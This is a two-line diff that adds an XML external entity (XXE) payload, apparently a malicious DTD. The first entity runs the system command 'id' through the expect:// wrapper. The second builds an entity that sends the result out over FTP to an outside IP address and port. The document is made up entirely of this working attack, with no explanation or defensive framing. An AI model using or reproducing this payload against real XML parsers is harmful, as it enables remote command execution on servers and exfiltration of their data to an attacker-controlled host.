@@ -1,0 +1,2 @@
+<!ENTITY % d SYSTEM "expect://id">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://91.235.116.123:5213/%d;'>">
